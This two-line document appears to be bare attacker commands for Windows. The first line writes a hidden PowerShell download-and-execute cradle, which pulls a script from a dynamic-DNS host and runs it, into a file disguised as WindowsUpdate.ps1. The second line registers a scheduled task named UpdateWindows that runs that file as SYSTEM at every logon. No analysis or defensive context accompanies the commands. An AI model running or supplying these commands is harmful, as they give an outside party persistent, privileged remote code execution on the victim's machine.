powershell echo "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://gh0st1nth3sh3ll.hopto.org:443/a'))" > C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
powershell schtasks.exe /ru "SYSTEM" /create /sc ONLOGON /tn UpdateWindows /tr C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1
